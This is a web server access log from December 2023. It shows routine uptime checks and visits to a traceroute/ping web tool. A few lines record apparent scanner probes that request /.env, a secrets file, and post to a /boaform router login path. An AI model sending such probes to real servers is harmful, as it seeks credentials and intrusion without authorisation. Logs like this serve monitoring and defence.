159.203.109.206 - - [16/Dec/2023:00:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 150 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 151 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 152 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 153 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 154 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 155 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 156 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 157 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 158 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 159 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 160 "www@docker" "http://172.29.0.8:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:01:31 +0000] "GET /trace/ HTTP/2.0" 200 3652 "-" "-" 161 "livetrace@docker" "http://172.29.0.3:80" 125ms
12.248.214.166 - - [16/Dec/2023:01:01:33 +0000] "GET /trace/starttrace.php?id=hvfxs3dxb HTTP/2.0" 200 106 "-" "-" 162 "livetrace@docker" "http://172.29.0.3:80" 3ms
12.248.214.166 - - [16/Dec/2023:01:01:34 +0000] "GET /trace/polltrace.php?id=hvfxs3dxb HTTP/2.0" 200 569 "-" "-" 163 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:01:01:35 +0000] "GET /trace/polltrace.php?id=hvfxs3dxb HTTP/2.0" 200 1160 "-" "-" 164 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:01:01:36 +0000] "GET /trace/polltrace.php?id=hvfxs3dxb HTTP/2.0" 200 1191 "-" "-" 165 "livetrace@docker" "http://172.29.0.3:80" 2ms
167.71.120.76 - - [16/Dec/2023:01:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 166 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 167 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 168 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 169 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 170 "www@docker" "http://172.29.0.8:80" 0ms
12.248.214.166 - - [16/Dec/2023:01:04:12 +0000] "GET /trace/ HTTP/2.0" 200 3652 "-" "-" 171 "livetrace@docker" "http://172.29.0.3:80" 9ms
143.110.222.166 - - [16/Dec/2023:01:04:14 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 172 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:01:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 173 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 174 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 175 "www@docker" "http://172.29.0.8:80" 0ms
12.248.214.166 - - [16/Dec/2023:01:05:25 +0000] "GET /trace/ HTTP/2.0" 200 3652 "-" "-" 176 "livetrace@docker" "http://172.29.0.3:80" 8ms
167.71.120.76 - - [16/Dec/2023:01:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 177 "www@docker" "http://172.29.0.8:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:05:43 +0000] "GET /trace/ HTTP/2.0" 200 4063 "-" "-" 178 "livetrace@docker" "http://172.29.0.3:80" 39ms
12.248.214.166 - - [16/Dec/2023:01:05:52 +0000] "GET /trace/ HTTP/2.0" 200 4063 "-" "-" 179 "livetrace@docker" "http://172.29.0.3:80" 7ms
12.248.214.166 - - [16/Dec/2023:01:06:01 +0000] "GET /trace/ HTTP/2.0" 200 4063 "-" "-" 180 "livetrace@docker" "http://172.29.0.3:80" 6ms
12.248.214.166 - - [16/Dec/2023:01:06:03 +0000] "GET /trace/ HTTP/2.0" 200 4063 "-" "-" 181 "livetrace@docker" "http://172.29.0.3:80" 5ms
159.203.109.206 - - [16/Dec/2023:01:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 182 "www@docker" "http://172.29.0.8:80" 11ms
167.71.120.76 - - [16/Dec/2023:01:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 183 "www@docker" "http://172.29.0.8:80" 17ms
12.248.214.166 - - [16/Dec/2023:01:06:46 +0000] "GET /trace/ HTTP/2.0" 200 4063 "-" "-" 184 "livetrace@docker" "http://172.29.0.3:80" 7ms
12.248.214.166 - - [16/Dec/2023:01:06:46 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 200 1387 "-" "-" 185 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:06:46 +0000] "GET /favicon.ico HTTP/2.0" 404 555 "-" "-" 186 "www@docker" "http://172.29.0.8:80" 26ms
12.248.214.166 - - [16/Dec/2023:01:06:48 +0000] "GET /trace/ HTTP/2.0" 200 4063 "-" "-" 187 "livetrace@docker" "http://172.29.0.3:80" 5ms
12.248.214.166 - - [16/Dec/2023:01:06:51 +0000] "GET /trace/startping.php?id=1db3h7xx2 HTTP/2.0" 200 105 "-" "-" 188 "livetrace@docker" "http://172.29.0.3:80" 3ms
12.248.214.166 - - [16/Dec/2023:01:06:51 +0000] "GET /trace/starttrace.php?id=bw0u2bwgc HTTP/2.0" 200 106 "-" "-" 189 "livetrace@docker" "http://172.29.0.3:80" 4ms
12.248.214.166 - - [16/Dec/2023:01:06:52 +0000] "GET /trace/polltrace.php?id=bw0u2bwgc HTTP/2.0" 200 962 "-" "-" 191 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:06:52 +0000] "GET /trace/pollping.php?id=1db3h7xx2 HTTP/2.0" 200 90 "-" "-" 190 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:06:53 +0000] "GET /trace/pollping.php?id=1db3h7xx2 HTTP/2.0" 200 90 "-" "-" 192 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:06:53 +0000] "GET /trace/polltrace.php?id=bw0u2bwgc HTTP/2.0" 200 1403 "-" "-" 193 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:01:06:54 +0000] "GET /trace/pollping.php?id=1db3h7xx2 HTTP/2.0" 200 91 "-" "-" 194 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:06:55 +0000] "GET /trace/pollping.php?id=1db3h7xx2 HTTP/2.0" 200 91 "-" "-" 195 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:06:56 +0000] "GET /trace/pollping.php?id=1db3h7xx2 HTTP/2.0" 200 91 "-" "-" 196 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:06:57 +0000] "GET /trace/pollping.php?id=1db3h7xx2 HTTP/2.0" 200 91 "-" "-" 197 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:06:58 +0000] "GET /trace/pollping.php?id=1db3h7xx2 HTTP/2.0" 200 91 "-" "-" 198 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:01:06:59 +0000] "GET /trace/pollping.php?id=1db3h7xx2 HTTP/2.0" 200 101 "-" "-" 199 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:01:06:59 +0000] "GET /trace/cleanping.php?id=1db3h7xx2 HTTP/2.0" 200 71 "-" "-" 200 "livetrace@docker" "http://172.29.0.3:80" 3ms
159.203.109.206 - - [16/Dec/2023:01:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 201 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 202 "www@docker" "http://172.29.0.8:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:08:04 +0000] "GET /trace/ HTTP/2.0" 200 4063 "-" "-" 203 "livetrace@docker" "http://172.29.0.3:80" 7ms
12.248.214.166 - - [16/Dec/2023:01:08:04 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 204 "livetrace@docker" "http://172.29.0.3:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 205 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 206 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:01:09:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 207 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:01:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 208 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 209 "www@docker" "http://172.29.0.8:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:09:40 +0000] "GET /info HTTP/2.0" 404 555 "-" "-" 210 "www@docker" "http://172.29.0.8:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:09:44 +0000] "GET /php/ HTTP/2.0" 404 555 "-" "-" 211 "www@docker" "http://172.29.0.8:80" 1ms
12.248.214.166 - - [16/Dec/2023:01:09:48 +0000] "GET /pub/ HTTP/2.0" 200 11824 "-" "-" 212 "www@docker" "http://172.29.0.8:80" 158ms
12.248.214.166 - - [16/Dec/2023:01:09:49 +0000] "GET /pub/app/assets/hljs-github-dark.css HTTP/2.0" 304 0 "-" "-" 213 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 214 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 215 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 216 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 217 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 218 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 219 "www@docker" "http://172.29.0.8:80" 1ms
57.129.23.166 - - [16/Dec/2023:01:13:20 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 220 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:01:13:20 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 221 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:01:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 222 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 223 "www@docker" "http://172.29.0.8:80" 0ms
41.216.188.119 - - [16/Dec/2023:01:14:18 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 308 18 "-" "-" 224 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:01:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 225 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 226 "www@docker" "http://172.29.0.8:80" 0ms
12.248.214.166 - - [16/Dec/2023:01:14:40 +0000] "GET /pub/ HTTP/2.0" 200 9897 "-" "-" 227 "www@docker" "http://172.29.0.8:80" 16ms
159.203.109.206 - - [16/Dec/2023:01:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 228 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 229 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 230 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 231 "www@docker" "http://172.29.0.8:80" 1ms
35.203.210.185 - - [16/Dec/2023:01:16:48 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 232 "web-to-websecure@internal" "-" 0ms
35.203.210.185 - - [16/Dec/2023:01:16:48 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 233 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:01:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 234 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 235 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 236 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 237 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 238 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 239 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 240 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 241 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [16/Dec/2023:01:21:15 +0000] "GET /trace/ HTTP/2.0" 200 4094 "-" "-" 242 "livetrace@docker" "http://172.29.0.3:80" 37ms
173.48.140.140 - - [16/Dec/2023:01:21:16 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 243 "livetrace@docker" "http://172.29.0.3:80" 0ms
173.48.140.140 - - [16/Dec/2023:01:21:19 +0000] "GET /trace/startping.php?id=gn7sd06pp HTTP/2.0" 200 105 "-" "-" 245 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:01:21:19 +0000] "GET /trace/starttrace.php?id=82mpvhx9o HTTP/2.0" 200 106 "-" "-" 244 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:01:21:20 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 80 "-" "-" 246 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:20 +0000] "GET /trace/pollping.php?id=gn7sd06pp HTTP/2.0" 200 89 "-" "-" 247 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:21:21 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 80 "-" "-" 249 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:21 +0000] "GET /trace/pollping.php?id=gn7sd06pp HTTP/2.0" 200 90 "-" "-" 248 "livetrace@docker" "http://172.29.0.3:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 250 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:22 +0000] "GET /trace/pollping.php?id=gn7sd06pp HTTP/2.0" 200 91 "-" "-" 251 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:21:22 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 80 "-" "-" 252 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:21:23 +0000] "GET /trace/pollping.php?id=gn7sd06pp HTTP/2.0" 200 91 "-" "-" 253 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:21:23 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 80 "-" "-" 254 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:21:24 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 80 "-" "-" 255 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:24 +0000] "GET /trace/pollping.php?id=gn7sd06pp HTTP/2.0" 200 91 "-" "-" 256 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:25 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 655 "-" "-" 257 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:25 +0000] "GET /trace/pollping.php?id=gn7sd06pp HTTP/2.0" 200 90 "-" "-" 258 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:26 +0000] "GET /trace/pollping.php?id=gn7sd06pp HTTP/2.0" 200 90 "-" "-" 260 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:26 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 655 "-" "-" 259 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:27 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 655 "-" "-" 262 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:27 +0000] "GET /trace/pollping.php?id=gn7sd06pp HTTP/2.0" 200 99 "-" "-" 261 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:27 +0000] "GET /trace/cleanping.php?id=gn7sd06pp HTTP/2.0" 200 71 "-" "-" 263 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:01:21:28 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 678 "-" "-" 264 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:21:29 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 678 "-" "-" 265 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:30 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 678 "-" "-" 266 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:21:31 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 680 "-" "-" 267 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:21:32 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 680 "-" "-" 268 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:33 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 680 "-" "-" 269 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:21:34 +0000] "GET /trace/polltrace.php?id=82mpvhx9o HTTP/2.0" 200 932 "-" "-" 270 "livetrace@docker" "http://172.29.0.3:80" 2ms
167.71.120.76 - - [16/Dec/2023:01:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 271 "www@docker" "http://172.29.0.8:80" 0ms
54.36.115.221 - - [16/Dec/2023:01:22:22 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 272 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [16/Dec/2023:01:22:22 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 273 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:01:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 274 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 275 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 276 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 277 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:23:48 +0000] "GET /trace/ HTTP/2.0" 200 4092 "-" "-" 278 "livetrace@docker" "http://172.29.0.3:80" 4ms
173.48.140.140 - - [16/Dec/2023:01:23:49 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 279 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:23:50 +0000] "GET /trace/starttrace.php?id=labqkhlk7 HTTP/2.0" 200 106 "-" "-" 280 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:01:23:51 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 15 "-" "-" 281 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:23:52 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 15 "-" "-" 282 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:23:53 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 15 "-" "-" 283 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:23:54 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 38 "-" "-" 284 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:23:55 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 38 "-" "-" 285 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:23:56 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 38 "-" "-" 286 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:23:57 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 40 "-" "-" 287 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:23:58 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 40 "-" "-" 288 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:23:59 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 40 "-" "-" 289 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:24:00 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 512 "-" "-" 290 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:24:01 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 512 "-" "-" 291 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:24:02 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 512 "-" "-" 292 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:24:03 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 535 "-" "-" 293 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:24:04 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 535 "-" "-" 294 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:24:05 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 535 "-" "-" 295 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:24:06 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 537 "-" "-" 296 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:24:07 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 537 "-" "-" 297 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:24:08 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 537 "-" "-" 298 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:24:09 +0000] "GET /trace/polltrace.php?id=labqkhlk7 HTTP/2.0" 200 788 "-" "-" 299 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:24:09 +0000] "GET /trace/cleantrace.php?id=labqkhlk7 HTTP/2.0" 200 72 "-" "-" 300 "livetrace@docker" "http://172.29.0.3:80" 3ms
159.203.109.206 - - [16/Dec/2023:01:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 301 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 302 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [16/Dec/2023:01:25:10 +0000] "GET /trace/starttrace.php?id=n8mawvu2i HTTP/2.0" 200 106 "-" "-" 304 "livetrace@docker" "http://172.29.0.3:80" 4ms
173.48.140.140 - - [16/Dec/2023:01:25:10 +0000] "GET /trace/startping.php?id=6za9in5lz HTTP/2.0" 200 105 "-" "-" 303 "livetrace@docker" "http://172.29.0.3:80" 4ms
173.48.140.140 - - [16/Dec/2023:01:25:11 +0000] "GET /trace/polltrace.php?id=n8mawvu2i HTTP/2.0" 200 690 "-" "-" 306 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:11 +0000] "GET /trace/pollping.php?id=6za9in5lz HTTP/2.0" 200 90 "-" "-" 305 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:12 +0000] "GET /trace/polltrace.php?id=n8mawvu2i HTTP/2.0" 200 690 "-" "-" 307 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:01:25:12 +0000] "GET /trace/pollping.php?id=6za9in5lz HTTP/2.0" 200 90 "-" "-" 308 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:13 +0000] "GET /trace/polltrace.php?id=n8mawvu2i HTTP/2.0" 200 690 "-" "-" 309 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:01:25:13 +0000] "GET /trace/pollping.php?id=6za9in5lz HTTP/2.0" 200 91 "-" "-" 310 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:14 +0000] "GET /trace/pollping.php?id=6za9in5lz HTTP/2.0" 200 90 "-" "-" 312 "livetrace@docker" "http://172.29.0.3:80" 2ms
